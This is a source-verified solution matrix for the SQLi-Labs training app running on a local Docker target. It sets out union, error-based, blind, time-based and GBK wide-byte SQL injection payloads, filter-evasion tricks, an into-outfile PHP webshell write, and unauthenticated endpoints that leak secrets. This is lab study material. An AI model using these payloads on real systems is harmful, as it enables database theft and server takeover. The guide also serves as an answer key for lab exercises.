# SQLi-Labs — Source-Verified Solution Matrix (all lessons 1–65)

Read-only source analysis of `/Users/srlove/Desktop/python项目课/reference/sqli-labs`
(remote `https://github.com/Audi-1/sqli-labs.git`, branch `master`, commit `e96f217` "Adding error_reporting till lesson 20").
Every SQL string, filter and success-marker below is taken from the actual PHP, not from walkthroughs.
Line numbers refer to files in that checkout.

Legend: `-- ` = SQL comment (send as `%2D%2D%20` / space via `+`); `#` = send as `%23`; `SQ` = single quote, `DQ` = double quote.
`-1` is used as a non-existent id so the injected row is the only/first row.

**Deployment target** (workspace `labs/docker-compose.yml:35-41`): compose service `sqli-labs`, image
`acgpiano/sqli-labs:latest`, `platform: linux/amd64`, published at **`http://127.0.0.1:8085`**.
All URLs below are relative to the web root; prefix them with `{BASE} = http://127.0.0.1:8085`
(lesson pages `{BASE}/Less-N/`, helpers `{BASE}/sql-connections/…`). The image's on-disk document root is not
part of this checkout — resolve it at runtime via `phpinfo()` / boolean oracles (§1.6, §1.8, §6.1).

---

## 1. Environment

### 1.1 Provenance / files read

Top level is a **mind-map index only** (`index.html`, `index-1.html`, `index-2.html`, `index-3.html`); there is no
top-level `index.php`. Each lesson is a directory with `index.php` (lessons 24, 29–31, 42–45 also have
`login.php` / `pass_change.php` / `new_user.php` / `logged-in.php` / `hacked.php` etc.).
Read completely: `sql-connections/{db-creds.inc,setup-db.php,setup-db-challenge.php,functions.php,
sql-connect.php,sql-connect-1.php,sqli-connect.php,test.php}` and every `.php` under `Less-1` … `Less-65`.

Anomalies in the tree (ignore for solving):
* `index-3.html` (mind-map "Page-4 Challenges") lists `Less-54` … `Less-75`; only `Less-54` … `Less-65` exist.
* `Less-40/` contains an unused copy of the Less-24 login/registration app (`login.php`, `pass_change.php`,
  `new_user.php`, `login_create.php`, `logged-in.php`, `failed.php`, `forgot_password.php`). `Less-40/index.php`
  is the stacked-blind GET lesson; the extra files are dead code but are directly reachable by URL.
* `Less-42` … `Less-45` contain `acc-create.php`, `failed.php`, `forgot_password.php` *(static image pages)*;
  `Less-43/Text-2.txt`, `Less-38/phpinfo.php` are leftovers.
* Every lesson directory contains `result.txt`, an append-only log of the raw payload (`ID:…`, `User Name:…`,
  `SORT:…`). Web-readable; harmless.
* `tomcat-files.zip` (repo root) contains Java/Tomcat variants of Less-29…32 (`Less-29/index.jsp`, `hacked.jsp`,
  `Less-32/index.jsp`, …; 23 files, verified). Only relevant if the deployment serves JSPs — the compose lab is a
  PHP/Apache image, so it does not (§6.6).

### 1.2 Database credentials and names (`sql-connections/db-creds.inc`)

```php
$dbuser = 'root';   $dbpass = '';      $host = 'localhost';
$dbname  = "security";                 // all normal labs
$dbname1 = "challenges";               // challenge labs (Less-54..65)
```

### 1.3 Initialisation / reset (exact URLs)

| Action | Request | Effect |
|---|---|---|
| Full init/reset | `GET /sql-connections/setup-db.php` | DROP+CREATE `security` (`CHARACTER SET gbk`), tables `users`,`emails`,`uagents`,`referers`, inserts rows; then **includes** `setup-db-challenge.php`, which DROP+CREATEs `challenges`, one random table + one row |
| Challenge-only reset | `GET /sql-connections/setup-db-challenge.php` | DROP+CREATE `challenges` with **new** random table name, **new** random secret-column name and **new** random secret value |
| Challenge page self-reset | `POST /Less-N/index.php` body `reset=Reset the Challenge!` | Only sets a dead cookie + HTML `<meta>`/`Refresh` to `setup-db-challenge.php`; **nothing happens unless the client follows the refresh** |

Init response is a deterministic marker set:
`[ * ]...................Old database 'SECURITY' purged if exists`, `Creating New database 'SECURITY' successfully`,
`Creating New Table 'USERS' successfully`, … and from the challenge include:
`[*]...................Creating New Table '<10-char-random>' successfully` ← **reveals the random table name**,
`[*]...................Inserted secret key 'secret_XXXX' into table` ← this echo is a **bug: it prints the random
COLUMN NAME (`$secret_key` variable), not the key value**. Do not mistake it for the secret key.
The `security` DB and challenge DB are (re)created only by these scripts; `sql-lab.sql` at repo root is a legacy,
incomplete dump (8 users, no `admin/admin`) — do **not** initialise from it.

### 1.4 Schemas

`security` DB (`gbk`; important for Less-32..37):

```sql
users(id int(3) auto_increment, username varchar(20), password varchar(20), PK id)
emails(id, email_id varchar(30))
uagents(id, uagent varchar(256), ip_address varchar(35), username varchar(20))
referers(id, referer varchar(256), ip_address varchar(35))
```

`users` rows inserted by `setup-db.php:112` (13 rows):
`1 Dumb/Dumb, 2 Angelina/I-kill-you, 3 Dummy/p@ssword, 4 secure/crappy, 5 stupid/stupidity,
6 superman/genious, 7 batman/mob!le, 8 admin/admin, 9 admin1/admin1, 10 admin2/admin2,
11 admin3/admin3, 12 dhakkan/dumbo, 14 admin4/admin4`.
`admin/admin` (id 8) and `Dumb/Dumb` (id 1) are the useful login credentials. *

\* state pitfall: Less-24 rewrites `admin`'s password (second-order UPDATE) and Less-17 can rewrite it too.
Use `uname=Dumb&passwd=Dumb` for login-required lessons (Less-18/19), and keep in mind that
Re-running `setup-db.php` restores everything.

`challenges` DB (`setup-db-challenge.php:44-63`), per reset exactly **one** table:

```sql
CREATE TABLE challenges.<10 chars A-Z0-9>(
  id INT(2) UNSIGNED NOT NULL DEFAULT 1,
  sessid CHAR(32) PRIMARY KEY NOT NULL,       -- md5(rand(0,100000))
  secret_<4 chars A-Z0-9> CHAR(32) NOT NULL,  -- the secret key column
  tryy INT(11) UNSIGNED NOT NULL DEFAULT 0)   -- shared attempt counter
INSERT INTO <table> VALUES (1, '<md5>', '<24 chars A-Za-z0-9>', 0)
```

`functions.php` generates names with `num_gen(len,chars)`:
`$table = num_gen(10, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')`,
`$secret_key = "secret_".num_gen(4, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')`;
the **value** uses `num_gen(24, 'A-Za-z0-9')`.
`table_name()` = `SELECT table_name FROM information_schema.tables WHERE table_schema='challenges'` (first row).
`column_name($i)` = `SELECT column_name FROM information_schema.columns WHERE table_name='$table' LIMIT $i,1`
→ `column_name(1)`=`sessid`, `column_name(2)`=`secret_XXXX` (ordinal positions 2 and 3).

**Where the random names live:** as real MySQL identifiers in the `challenges` DB, i.e. in `information_schema`
(discoverable only via the lesson's SQL injection — or via the setup-page echo / `test.php`, below).
**Not** in the cookie. The cookie `challenge` the pages set contains only the `sessid` md5 value and is never used
in the challenge SQL.
**What proves success:** `POST <lesson>/index.php` with `answer_key=<anything>` and `key=<secret key>`.
Code: `$key = addslashes(mysql_real_escape_string($_POST['key']))` — no injection possible in that check;
`SELECT 1 FROM <table> WHERE <secret_col> = '$key'`.
Success body contains `<img src="../images/Less-54-1.jpg" />` (this is the single shared success marker for
**all** of Less-54..65). Failure body contains `../images/slap1.jpg`.
After success/failure-overflow PHP emits an HTTP **`Refresh:`** header to `setup-db-challenge.php` — note that
the challenge DB is only actually regenerated if a client follows that Refresh. A plain Python HTTP client does
**not**, so the table/key survives (see §4.17).

### 1.5 Secondary leak / shortcut (challenge series) — needs live verification

`sql-connections/test.php` is a dev script:

```php
include 'db-creds.inc'; include 'sql-connect-1.php'; include 'functions.php';
$tab = table_name(); $col = column_name(2); $data = data($tab,$col); echo $data;
```

→ `GET /sql-connections/test.php` echoes the **current 24-char secret key in cleartext**.
If the deployment still ships this file (standard Docker/sqli-labs images do), all of Less-54..65 can be solved
with one GET + the key-submission POST. Treat as a shortcut, verify presence before relying on it.

A second zero-injection leak: `GET /sql-connections/setup-db-challenge.php` (no auth) drops + recreates the
`challenges` DB and prints `Creating New Table '<10-char-name>' successfully` and
`Inserted secret key 'secret_XXXX' into table` → the **new random table name and secret-column name are echoed**
(the secret *value* is not). `sql-connections/test.php` itself is present in this checkout (`test.php:1-11`, verified:
includes `db-creds.inc`, `sql-connect-1.php`, `functions.php`; `echo data(table_name(), column_name(2))`).
Whether the container image ships these files unchanged is a runtime check (§6.2).

### 1.6 Runtime assumptions (verify once per environment)

* Apache + PHP **5.x** — the code uses `mysql_*` (removed in PHP 7), `mysqli_*`, and `get_magic_quotes_gpc()`
  (removed in PHP 8). On PHP 7/8 every lesson fatals.
* MySQL 5.x (`UPDATEXML`/`EXTRACTVALUE` in error payloads; `information_schema` available; DB created `gbk`).
  If MySQL 8 (where the XPath-error trick may differ), fall back to the `floor(rand(0)*2)` "double injection"
  (`Duplicate entry` error) payloads listed for Less-5/6/13/14.
* `output_buffering` must be non-zero (a normal php.ini `= 4096` suffices) because several lessons call
  `setcookie()`/`header()` **after** HTML output: Less-20/21/22 login branch and Less-24/42–45 `login.php`.
  Without buffering the `Auth`/`uname` cookies can silently fail to be set; workaround: send the `Auth=1`
  cookie manually (see §4.15).
* `{BASE}` used below = `http://127.0.0.1:8085` (the compose lab, §0). URLs are written relative to the web root:
  lessons at `{BASE}/Less-N/`, helpers at `{BASE}/sql-connections/`.
  The image's docroot is *not* in this source tree. Read it from `GET {BASE}/Less-38/phpinfo.php`
  (`_SERVER['DOCUMENT_ROOT']`); if that file is absent, brute it with the L7 boolean `load_file()` oracle (§4.3).
  Candidate outfile directories: `/var/www/html`, `/var/www/html/sqli-labs`, `/app`, `/opt/lampp/htdocs` (§6.1).
* Health check: `GET /Less-1/index.php?id=1` → body contains `Your Login name:Dumb` and `Your Password:Dumb`.

### 1.7 Cross-lesson state to watch

* `setup-db.php` is the single source of truth; run it before each full test-suite run.
* Less-24 changes the password of `admin` (if you run it before login-based labs, logins as `admin/admin` fail:
  use `Dumb/Dumb`).
* Less-17's intended payload aborts the UPDATE via an error, so it does not corrupt data; a boolean payload would.
* Stacked-query labs (Less-38..41, 42..45, 50..53) insert rows. Re-use of the same synthetic id causes a silent
  duplicate-key failure — pick a fresh id/username per attempt.
* Challenge DB / attempt counter (`tryy`) is **shared by all 12 challenge lessons** (single table, single row).
  Solving one lesson with `test.php` or a union dump gives the key valid for all 12 until a real reset.

---

### 1.8 Unauthenticated recon / shortcut endpoints present in this checkout

| Endpoint | What it leaks / does | Solver use |
|---|---|---|
| `GET {BASE}/Less-38/phpinfo.php` | full `phpinfo()`: `DOCUMENT_ROOT`, PHP version, `output_buffering`, `disable_functions`, `safe_mode`, MySQL client info | **resolves the L7 outfile path** and validates §1.6 assumptions |
| `GET {BASE}/sql-connections/test.php` | current 24-char challenge **secret key** in cleartext (`echo data(table_name(), column_name(2))`) | instantly answer any of Less-54…65 |
| `GET {BASE}/sql-connections/setup-db.php` | DROP/CREATE `security` + `challenges`, seeds data; echoes the new random challenge table + secret-column names | deterministic full reset; harvest challenge identifiers without SQLi |
| `GET {BASE}/sql-connections/setup-db-challenge.php` | DROP/CREATE only `challenges`; echoes new random table/column names | fresh challenge seed |

All four are plain PHP files with no auth check in this checkout; confirm HTTP 200 on the image first (§6.2).
Note `phpinfo()` also confirms `output_buffering`, `magic_quotes_gpc` and the PHP version the labs require.

---

## 2. Request/encoding conventions (applies to every lesson)

### 2.1 Encoding

* GET: build the raw query string or use `params=[('id', payload)]` (a list of tuples — required for the
  duplicate-`id` HPP labs Less-29..31). Lets the client encode spaces as `+`/`%20` and `#` as `%23`.
* POST: `application/x-www-form-urlencoded`; `#` inside a value is encoded `%23`, so `… union select 1,2#` works.
* Wide-byte labs (Less-32..37): put the raw byte `0xDF` in the value (`params={'id': b"-1\xdf' union …"}` /
  `data={'uname': b"-1\xdf' union …"}`); the client encodes it `%DF`.
* Cookies (Less-20/21/22): PHP URL-decodes cookie values automatically, so percent-encode the payload (raw `;`,
  space, quotes are safer encoded). For base64 cookies encode the base64 string (`quote(b64, safe='')`) so `+`
  and `=` survive (`+` would otherwise become a space in the cookie header).
* Keep one `requests.Session()` per lesson: PHPSESSID + `Auth` + `uname` cookies matter for Less-24/42–45.

### 2.2 Quote-context cheat sheet (derive any payload from the template)

| Template in source | Context | Break-out prefix | Comment |
|---|---|---|---|
| `id='$id'` | single-quoted string | `-1'` | `%23` or `-- ` |
| `id=$id` | integer | `-1` | `%23` / `-- ` |
| `id=('$id')` | single-quoted, parenthesised | `-1')` | `%23` / `-- ` |
| `id=$id` where `$id='"'...'"'` | double-quoted string | `-1"` | `%23` / `-- ` |
| `id=($id)` where `$id='"'...'"'` | double-quoted, parenthesised | `-1")` | `%23` / `-- ` |
| `id=(('$id'))` | double-parenthesised single-quoted | `-1'))` | `%23` / `-- ` |
| `id=(($id))` | double-parenthesised integer | `-1))` | `%23` / `-- ` |
| `id=($id)` where `$id='("'…'")'` | double-quoted, parenthesised (challenge L60, L65) | `-1")` | `%23` / `-- ` |
| `id=($id)` (int) | parenthesised integer | `-1)` | `%23` / `-- ` |

Union column counts: `SELECT * FROM users` = **3**; `SELECT username,password` (Less-11..16, 34, 37) = **2**;
insert/update/order-by/header labs do **not** use union.

### 2.3 Comment/filter notes

* `#` works in every lesson **except** Less-23 (strips `#` and `--`) and Less-26/26a/27/27a/28 (strip `#`,`--`,`/*`
  too; 26/26a/28 also strip all whitespace, 27/27a strip only space/`+` — see below).
* `-- ` needs the following space (MySQL). `--+` in a URL is `--` + space, fine on GET; in bodies write `--%20`
  or just use `#`.
* Lessons 25/25a strip the substrings `or` and `and` **case-insensitively anywhere** → use `||`/`&&` operators,
  or double the letters inside identifiers (`passwoorrd` → filter yields `password`; `infoorrmation_schema` →
  `information_schema`). Union payloads without `or`/`and` need no trick.
* Lessons **26/26a** strip **all whitespace** (`\s`, incl. tab/newline) and slashes → zero whitespace allowed;
  separate tokens with parentheses, e.g. `union(select(1),database(),3)`.
* Lessons **27/27a** strip only the literal characters **space and `+`** (`preg_replace('/[ +]/')`) plus `/*`, `--`, `#`.
  **Tab (`%09`) and newline (`%0A`) are NOT stripped** and work as whitespace. They additionally strip
  `select`/`union` in exactly six case forms (`select`,`union`,`SELECT`,`UNION`,`Select`,`Union`) → use mixed case
  (`SeLeCt`, `uNiOn`); `AND` is not filtered at all. Two payload styles therefore work: parenthesis-only, or
  tab/newline-separated: `-1'%0AuNiOn%0AsElEcT%0A1,database(),version()%0AAND%0A'`.
* Lessons 28/28a strip `union\s+select` (i) — after whitespace is removed nothing can match a space-separated
  form, so `union(select(...))` passes; Less-28 also strips comments/spaces, 28a only the union-select regex.
* Wide-byte labs execute `mysql_query("SET NAMES gbk")` right before the query, and `security` is created
  `CHARACTER SET gbk`; `addslashes`/`mysql_real_escape_string` prepends `0x5C` before `0x27`, giving GBK bytes
  `DF 5C` which swallow the backslash — the quote stays live.

### 2.4 Oracle channels and exact marker strings

| Channel | Lessons | Detection |
|---|---|---|
| Union display | 1–4, 11,12, 20–22 (via cookie), 23, 25,25a, 28,28a, 29–37, 38,39,40,41, 54–57 | `Your Login name:` / `Your Username is : ` + injected value |
| Error text | 1–6, 11–14, 17–23, 25–27, 29,31, 32–39, 42,43, 46,47, 50,51, 58–61 | `XPATH syntax error: '~<extracted>~'` (or `Duplicate entry '…' for key 'group_key'`) |
| Row-present boolean | 7,8,13,14,15,16,40,41,48,49,52,53,62–65 | 7: `You are in.... Use outfile......` vs `You have an error in your SQL syntax`; 8: `You are in...........` present/absent; 13/14/15/16: `../images/flag.jpg` present vs `../images/slap.jpg`; 40/41: `Your Username is :` present/absent; 62–65: `Your Login name : ` present/absent; 48/49/52/53: user rows `<td>` present/absent |
| Time only | **9, 10** (both branches print `You are in...........`) | `time.sleep` baseline vs `sleep(2)` |
| Login-state | 24, 42, 43, 44, 45 | `YOU ARE LOGGED IN AS` on `logged-in.php`, or HTTP `Location: logged-in.php` |
| Challenge key accepted | 54–65 | response contains `images/Less-54-1.jpg` (failure: `slap1.jpg`) |

`error_reporting(0)` is set in most pages, but `print_r(mysql_error())`/`die(mysql_error())` still prints the
string; the marker to grep is `XPATH syntax error` (payload-free, always present on a successful error payload).
XPath error payload content is truncated by MySQL (≈32 chars), so dump ≤24 chars per error payload; split long
values with `substr(...,1,16)` / `substr(...,17,8)`.

### 2.5 Single-statement vs multi-statement

`mysql_query()` (Less-1 … 37, and 20–22, 29–31, 46–49) executes **one** statement — `;` gives a syntax error.
`mysqli_multi_query()` — **stacked queries work** in: **38,39,40,41, 42,43,44,45, 50,51,52,53**.
For 38/39 and 50/51 the PHP only prints `mysqli_error` when the **first** statement fails, so make the injected
error part of the first statement; second-statement errors are invisible.

---

## 3. Lesson index

| # | Dir | URL (method) | Injectable parameter(s) | Category | Target | Oracle | Notes |
|---|---|---|---|---|---|---|---|
| 1 | Less-1 | `/Less-1/index.php` GET | `id` | union/error, string `'` | security.users | union+error | 3 cols |
| 2 | Less-2 | `/Less-2/index.php` GET | `id` | union/error, integer | security.users | union+error | 3 cols |
| 3 | Less-3 | `/Less-3/index.php` GET | `id` | union/error, string `('…')` | security.users | union+error | 3 cols |
| 4 | Less-4 | `/Less-4/index.php` GET | `id` | union/error, string `("…")` | security.users | union+error | 3 cols |
| 5 | Less-5 | `/Less-5/index.php` GET | `id` | double-injection error, string `'` | security.users | error | no row display |
| 6 | Less-6 | `/Less-6/index.php` GET | `id` | double-injection error, string `"` | security.users | error | no row display |
| 7 | Less-7 | `/Less-7/index.php` GET | `id` | outfile / boolean blind, `(('…'))` | writes a file; then elsewhere | row-bool + file | no error text |
| 8 | Less-8 | `/Less-8/index.php` GET | `id` | boolean blind, string `'` | security.users | row-bool | "You are in" |
| 9 | Less-9 | `/Less-9/index.php` GET | `id` | time blind, string `'` | security.users | time | identical output both branches |
| 10 | Less-10 | `/Less-10/index.php` GET | `id` | time blind, string `"` | security.users | time | identical output both branches |
| 11 | Less-11 | `/Less-11/index.php` POST | `uname`, `passwd` (uname) | POST union/error, `'` | security.users | union+error | 2 cols |
| 12 | Less-12 | `/Less-12/index.php` POST | `uname` (`("…")`) | POST union/error, `"` | security.users | union+error | 2 cols |
| 13 | Less-13 | `/Less-13/index.php` POST | `uname` (`('…')`) | POST double-injection error | security.users | error | 2 cols, data not shown |
| 14 | Less-14 | `/Less-14/index.php` POST | `uname` (`"…"`) | POST double-injection error | security.users | error | 2 cols, data not shown |
| 15 | Less-15 | `/Less-15/index.php` POST | `uname` (`'…'`) | POST boolean blind | security.users | row-bool (flag/slap) | 2 cols |
| 16 | Less-16 | `/Less-16/index.php` POST | `uname` (`("…")`) | POST boolean blind | security.users | row-bool (flag/slap) | 2 cols |
| 17 | Less-17 | `/Less-17/index.php` POST | `passwd` (uname safe) | UPDATE-query error | security.users (UPDATE) | error | needs existing `uname` |
| 18 | Less-18 | `/Less-18/index.php` POST+header | `User-Agent` header | header INSERT error | security.uagents | error | needs valid login POST |
| 19 | Less-19 | `/Less-19/index.php` POST+header | `Referer` header | header INSERT error | security.referers | error | needs valid login POST |
| 20 | Less-20 | `/Less-20/index.php` GET+cookie | cookie `uname` | cookie SELECT union/error | security.users | union+error | no login needed |
| 21 | Less-21 | `/Less-21/index.php` GET+cookie | cookie `uname` base64 | cookie union/error, `('…')` | security.users | union+error | base64 single-quote |
| 22 | Less-22 | `/Less-22/index.php` GET+cookie | cookie `uname` base64 | cookie union/error, `"…"` | security.users | union+error | base64 double-quote |
| 23 | Less-23 | `/Less-23/index.php` GET | `id` | union/error, no comments | security.users | union+error | `#`,`--` removed |
| 24 | Less-24 | `/Less-24/login_create.php`, `/Less-24/login.php`, `/Less-24/pass_change.php` | registration `username`, then session | second-order UPDATE | security.users | login-state | 4-request chain |
| 25 | Less-25 | `/Less-25/index.php` GET | `id` | union/error, `or`/`and` filtered | security.users | union+error | |
| 25a | Less-25a | `/Less-25a/index.php` GET | `id` | union, integer, `or`/`and` filtered | security.users | union | error hidden |
| 26 | Less-26 | `/Less-26/index.php` GET | `id` | error union/space/comment filtered | security.users | error | whitespace stripped |
| 26a | Less-26a | `/Less-26a/index.php` GET | `id` | boolean blind, parens, filters | security.users | row-bool | |
| 27 | Less-27 | `/Less-27/index.php` GET | `id` | error, `select`/`union`/space filtered | security.users | error | mixed case |
| 27a | Less-27a | `/Less-27a/index.php` GET | `id` | boolean blind, DQ, filters | security.users | row-bool | |
| 28 | Less-28 | `/Less-28/index.php` GET | `id` | union, `union\s+select` filtered | security.users | union | parens, no whitespace |
| 28a | Less-28a | `/Less-28a/index.php` GET | `id` | union, `union\s+select` filtered | security.users | union | comments allowed |
| 29 | Less-29 | `/Less-29/login.php` GET (HPP) | `id` (first numeric + second payload) | WAF whitelist + HPP, `'` | security.users | union+error | `/Less-29/index.php` has no WAF |
| 30 | Less-30 | `/Less-30/login.php` GET (HPP) | `id` dup | WAF + HPP, `"` | security.users | union | ditto |
| 31 | Less-31 | `/Less-31/login.php` GET (HPP) | `id` dup | WAF + HPP, `("…")` | security.users | union+error | ditto |
| 32 | Less-32 | `/Less-32/index.php` GET | `id` | addslashes + GBK wide byte | security.users | union+error | `%DF` |
| 33 | Less-33 | `/Less-33/index.php` GET | `id` | addslashes + GBK wide byte | security.users | union+error | `%DF` |
| 34 | Less-34 | `/Less-34/index.php` POST | `uname`, `passwd` | addslashes + GBK, POST | security.users | union+error | 2 cols |
| 35 | Less-35 | `/Less-35/index.php` GET | `id` | addslashes irrelevant (integer) | security.users | union+error | |
| 36 | Less-36 | `/Less-36/index.php` GET | `id` | mysql_real_escape_string + GBK | security.users | union+error | `%DF` |
| 37 | Less-37 | `/Less-37/index.php` POST | `uname`, `passwd` | mysql_real_escape_string + GBK | security.users | union+error | 2 cols |
| 38 | Less-38 | `/Less-38/index.php` GET | `id` | stacked + union/error, `'` | security.users | union+error+stacked | 3 cols |
| 39 | Less-39 | `/Less-39/index.php` GET | `id` | stacked + union/error, integer | security.users | union+error+stacked | 3 cols |
| 40 | Less-40 | `/Less-40/index.php` GET | `id` | stacked + union/boolean, `('…')` | security.users | union row + row-bool/stacked | errors hidden |
| 41 | Less-41 | `/Less-41/index.php` GET | `id` | stacked + union/boolean, integer | security.users | union row + row-bool/stacked | errors hidden |
| 42 | Less-42 | `/Less-42/login.php` POST | `login_password` (raw) | stacked/error login | security.users | error/login | fields `login_user`,`login_password` |
| 43 | Less-43 | `/Less-43/login.php` POST | `login_password` (`('…')`) | stacked/error login | security.users | error/login | paren twist |
| 44 | Less-44 | `/Less-44/login.php` POST | `login_password` | stacked/blind login | security.users | login/blind | no error output |
| 45 | Less-45 | `/Less-45/login.php` POST | `login_password` (`("…")`) | stacked/blind login | security.users | login/blind | paren twist |
| 46 | Less-46 | `/Less-46/index.php` GET | `sort` | ORDER BY numeric error | security.users | error | `ORDER BY $sort` |
| 47 | Less-47 | `/Less-47/index.php` GET | `sort` | ORDER BY string error | security.users | error | `ORDER BY '$sort'` |
| 48 | Less-48 | `/Less-48/index.php` GET | `sort` | ORDER BY blind numeric | security.users | row-bool | rows vs no rows |
| 49 | Less-49 | `/Less-49/index.php` GET | `sort` | ORDER BY blind string | security.users | row-bool | |
| 50 | Less-50 | `/Less-50/index.php` GET | `sort` | ORDER BY + stacked + error | security.users | error/stacked | mysqli |
| 51 | Less-51 | `/Less-51/index.php` GET | `sort` | ORDER BY + stacked + error | security.users | error/stacked | quoted |
| 52 | Less-52 | `/Less-52/index.php` GET | `sort` | ORDER BY + stacked blind | security.users | stacked bool/rows | |
| 53 | Less-53 | `/Less-53/index.php` GET | `sort` | ORDER BY + stacked blind | security.users | stacked bool/rows | |
| 54 | Less-54 | `/Less-54/index.php` GET+POST | `id` (GET), `key`+`answer_key` (POST) | challenge union, `'` | security.users → challenges.* | union | 10 attempts |
| 55 | Less-55 | `/Less-55/index.php` GET+POST | `id`, `key` | challenge union, integer | idem | union | 14 |
| 56 | Less-56 | `/Less-56/index.php` GET+POST | `id`, `key` | challenge union, `('…')` | idem | union | 14 |
| 57 | Less-57 | `/Less-57/index.php` GET+POST | `id`, `key` | challenge union, `"…"` | idem | union | 14 |
| 58 | Less-58 | `/Less-58/index.php` GET+POST | `id`, `key` | challenge double-injection error, `'` | idem | error | 5 |
| 59 | Less-59 | `/Less-59/index.php` GET+POST | `id`, `key` | challenge error, integer | idem | error | 5 |
| 60 | Less-60 | `/Less-60/index.php` GET+POST | `id`, `key` | challenge error, double-quoted parens `("…")` | idem | error | 5 |
| 61 | Less-61 | `/Less-61/index.php` GET+POST | `id`, `key` | challenge error, `(('…'))` | idem | error | 5 |
| 62 | Less-62 | `/Less-62/index.php` GET+POST | `id`, `key` | challenge blind, `('…')` | idem | row-bool | 130 |
| 63 | Less-63 | `/Less-63/index.php` GET+POST | `id`, `key` | challenge blind, `'` | idem | row-bool | 130 |
| 64 | Less-64 | `/Less-64/index.php` GET+POST | `id`, `key` | challenge blind, `(($id))` | idem | row-bool | 130 |
| 65 | Less-65 | `/Less-65/index.php` GET+POST | `id`, `key` | challenge blind, double-quoted parens `("…")` | idem | row-bool | 130 |

---

## 4. Per-lesson detail

### 4.1 Less-1 … Less-4 (GET union/error, `sql-connect.php` → `security`)

Templates and filters: no input filtering at all.

| Lesson | `index.php:29…` SQL | Break-out |
|---|---|---|
| 1 | `SELECT * FROM users WHERE id='$id' LIMIT 0,1` | `-1'` |
| 2 | `SELECT * FROM users WHERE id=$id LIMIT 0,1` | `-1` |
| 3 | `SELECT * FROM users WHERE id=('$id') LIMIT 0,1` | `-1')` |
| 4 | `$id = '"'.$id.'"';` … `id=($id)` | `-1")` |

P1 (union, 3 cols; displays `Your Login name:<col2>` and `Your Password:<col3>`):
* `1`: `?id=-1' union select 1,database(),version()-- `
* `2`: `?id=-1 union select 1,database(),version()-- `
* `3`: `?id=-1') union select 1,database(),version()-- `
* `4`: `?id=-1") union select 1,database(),version()-- `

Success marker: body contains `Your Login name:security` (or whichever value you injected).
P2 (error-based): `?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- ` (adjust quote for 2/3/4) →
`XPATH syntax error: '~security~'`.
P3 (legacy "double injection", if XML functions unavailable):
`?id=-1' union select 1,count(*),concat((select database()),floor(rand(0)*2)) from information_schema.tables group by 3-- `
→ `Duplicate entry 'security1' for key 'group_key'`.
Sanity: `?id=1` → `Your Login name:Dumb`.

### 4.2 Less-5 / Less-6 (double-injection error, string `'` / `"`)

* 5: `id='$id'`, 6: `$id='"'.$id.'"';` … `id=$id`.
* Row branch prints `You are in...........`; else branch prints `print_r(mysql_error())`. No row data is shown,
  so use the error channel.
* P1 (5): `?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- `
  (or `?id=-1' union select 1,extractvalue(1,concat(0x7e,(select database()),0x7e)),3-- `)
* P1 (6): `?id=1" and extractvalue(1,concat(0x7e,(select database()),0x7e))-- `
* P2 "double query": `?id=-1' union select 1,count(*),concat((select database()),floor(rand(0)*2)) from information_schema.tables group by 3-- `
* Marker: `XPATH syntax error: '~security~'`.

### 4.3 Less-7 (Dump into Outfile)

* `index.php:31` `SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1`; no filtering.
* Row → `You are in.... Use outfile......`; else → literal `You have an error in your SQL syntax` (real MySQL
  error hidden). 3 columns. `mysql_query` (single statement only).
* P1 (canonical, write a PHP marker/webshell then fetch it):
  `?id=-1')) union select 1,2,'<?php echo "pwned"; ?>' into outfile '/var/www/html/Less-7/out.php'-- `
  then `GET /Less-7/out.php` → body `pwned`. **Web-root path is deployment-specific.** Resolve it first:
  `GET {BASE}/Less-38/phpinfo.php` → `_SERVER['DOCUMENT_ROOT']` (fastest, §1.8), else probe with this lesson's own
  boolean oracle: `?id=1')) and (length(load_file('<DOCROOT>/Less-7/index.php'))>0)-- ` → `You are in.... Use outfile......`
  iff the guessed path exists (try `/var/www/html`, `/var/www/html/sqli-labs`, `/app`, `/opt/lampp/htdocs`).
  Also requires FILE privilege (db user is `root`) and a docroot dir writable by the mysqld user — verify live (§6.1).
* P2 (no-FILE fallback, boolean blind — works because the two branches are distinguishable):
  baseline `?id=1')) and 1=1-- ` → `You are in.... Use outfile......`; `?id=1')) and 1=2-- ` → the syntax-error text.
  Extract e.g. char-by-char: `?id=1')) and ascii(substr(database(),1,1))>77-- `.

### 4.4 Less-8 / Less-9 / Less-10 (blinds)

* 8: `id='$id'`; row → `You are in...........`, no row → empty font tag (NO error text) → boolean blind.
* 9: `id='$id'`; **both** branches print `You are in...........` → time blind only.
* 10: `id=$id` with `$id='"'...'"'`; same as 9 → time blind only.
* P1 (8, boolean): baseline `?id=1' and 1=1-- ` (marker present) / `?id=1' and 1=2-- ` (absent);
  extract `?id=1' and ascii(substr(database(),1,1))>77-- `.
* P1 (9, time): `?id=1' and sleep(2)-- ` (≈2 s; also `?id=1' and if(ascii(substr(database(),1,1))>77,sleep(2),0)-- `).
* P1 (10, time): `?id=1" and sleep(2)-- ` / same with `if(...)`.
* Marker: 8 → substring `You are in...........` present/absent; 9/10 → elapsed-time threshold (e.g. >1.5 s).

### 4.5 Less-11 … Less-16 (POST login form `uname`/`passwd`; form action="" → same `index.php`)

All read `$_POST['uname']` and `$_POST['passwd']` (both required). Only **`uname` is useful for the quoted labs**;
`passwd` is another independent injection point but the displayed row comes from the first projection.
Template changes per lesson (see below). 2 result columns (`username`,`password`).

| Lesson | SQL (`index.php`) | Break-out for `uname` |
|---|---|---|
| 11 | `username='$uname' and password='$passwd' LIMIT 0,1` | `-1'` |
| 12 | `$uname='"'.$uname.'"'; $passwd='"'.$passwd.'"';` … `username=($uname) and password=($passwd)` | `-1")` |
| 13 | `username=('$uname') and password=('$passwd')` | `-1')` |
| 14 | `$uname='"'.$uname.'"'; … username=$uname and password=$passwd` | `-1"` |
| 15 | `username='$uname' and password='$passwd'` | `-1'` (boolean/OR) |
| 16 | `$uname='"'.$uname.'"'; … username=($uname) and password=($passwd)` | `-1")` (boolean/OR) |

* P1 (11/12, union display): POST `uname=-1' union select 1,database()#` + `passwd=x`
  (12: `uname=-1") union select 1,database()#`). Body then has `Your Login name:1` `Your Password:security`.
* P1 (13/14, error only — success branch hides username/password and just prints `../images/flag.jpg`):
  `uname=1') and extractvalue(1,concat(0x7e,(select database()),0x7e))#` (14: `uname=1" and extractvalue(...)#`).
